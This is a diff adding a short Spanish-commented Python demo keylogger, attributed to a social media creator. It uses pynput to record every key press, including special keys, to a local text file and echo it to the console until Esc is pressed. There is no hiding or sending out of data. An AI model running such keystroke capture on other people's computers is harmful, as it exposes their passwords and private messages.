@@ -1,0 +1,32 @@
+#Version Guarda el archivo en tu bloc de notas 
+#Por David Ruiz
+#Esta versión es una prueba demo de como el script puede detectar cada tecla que presionas.
+#redes sociales @viajatech
+#Puedes usar mi script siempre y cuando me des créditos en mis redes sociales
+#Recuerda importar la libreria pynput
+
+from pynput import keyboard
+
+# Nombre del archivo donde se guardarán las teclas presionadas
+filename = 'teclado_by_viajatech.txt'
+
+def on_press(key):
+    try:
+        # Si es una tecla alfabética, muestra su carácter y lo guarda en el archivo
+        with open(filename, 'a') as f:
+            f.write(key.char)
+        print(f'Tecla presionada: {key.char}')
+    except AttributeError:
+        # Si es una tecla especial (como Shift o Ctrl), muestra su nombre y lo guarda en el archivo
+        with open(filename, 'a') as f:
+            f.write(f'[{key}]')
+        print(f'Tecla especial presionada: {key}')
+
+def on_release(key):
+    # Finaliza el listener si se presiona la tecla 'Esc'
+    if key == keyboard.Key.esc:
+        return False
+
+# Inicia el listener del teclado
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
